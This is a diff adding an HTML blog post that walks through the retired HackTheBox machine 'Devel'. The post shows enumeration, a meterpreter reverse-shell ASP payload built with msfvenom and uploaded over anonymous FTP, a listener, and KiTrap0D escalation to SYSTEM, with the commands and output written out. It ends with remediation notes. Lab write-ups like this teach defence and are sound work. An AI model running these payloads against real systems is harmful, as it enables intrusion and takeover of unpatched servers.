@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Devel: anonymous FTP upload to IIS webshell to SYSTEM — Lucky Thandel</title>
+<meta name="description" content="Write access over anonymous FTP plus IIS serving the same folder: uploading an ASP webshell, catching the shell, then KiTrap0D to SYSTEM. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-02 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Devel: anonymous FTP upload to IIS webshell to SYSTEM</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Devel is a retired HackTheBox easy Windows machine built around one misconfiguration with two halves. Synopsis: an FTP server with anonymous write access plus an IIS web server serving the same directory over HTTP — together a webshell pipeline.</p>
+<h2><span class="amber">$</span> Box info</h2>
+<p>OS: Windows 7 (IIS 7.5). Difficulty: easy. Address: 10.10.10.5. Services that matter: FTP on 21 (Microsoft ftpd, same directories as the web root) and HTTP on 80 (IIS 7.5). Skills exercised: FTP capability testing, payload-to-stack matching (ASP for IIS), handler discipline, Windows kernel-privesc matching.</p>
+<h2><span class="amber">$</span> Skills required</h2>
+<p>Nmap service enumeration, FTP interaction by hand, msfvenom payload generation, Metasploit multi/handler operation, local exploit suggestion workflow.</p>
+<h2><span class="amber">$</span> Enumeration — FTP plus HTTP</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: services, then anonymous write</span>
+nmap -sC -sV -oN devel.nmap 10.10.10.5
+ftp 10.10.10.5
+Name: anonymous
+ftp&gt; put test.txt
+226 Transfer complete.</pre>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: IIS FTP plus IIS web</span>
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+80/tcp open  http    Microsoft IIS httpd 7.5
+Service Info: OS: Windows</pre>
+<p>FTP (IIS-hosted) and HTTP (IIS 7.5) on Windows 7. Anonymous login succeeds — and crucially, uploads succeed too, and uploaded files are served back over HTTP. Write via FTP, execute via HTTP: the whole foothold.</p>
+<h2><span class="amber">$</span> Foothold — ASP webshell</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: build, upload, trigger ASP shell</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f asp &gt; shell.asp
+ftp 10.10.10.5  # anonymous -&gt; put shell.asp
+msfconsole -q -x &quot;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.23; run&quot;
+# then browse http://10.10.10.5/shell.asp</pre>
+<p>The page executes server-side and a session opens as the IIS application-pool user — low privilege, but inside. Match the payload to the stack: ASP for IIS, not PHP.</p>
+<h2><span class="amber">$</span> Privilege escalation — KiTrap0D (MS10-015)</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: ms10_015_kitrap0d</span>
+msf6 &gt; use exploit/windows/local/ms10_015_kitrap0d
+msf6 exploit(ms10_015_kitrap0d) &gt; set SESSION 1
+msf6 exploit(ms10_015_kitrap0d) &gt; run
+[*] Meterpreter session 2 opened as NT AUTHORITY\SYSTEM</pre>
+<p>Sherlock (or local_exploit_suggester) points at the missing KiTrap0D patch. Both flags fall in the SYSTEM session. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Uploading a PHP shell out of habit (match the payload to the stack) and triggering the shell before starting the handler (always listeners first, clicks second).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Never allow anonymous FTP write, never serve an upload directory with script execution enabled, and patch kernel privesc CVEs. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
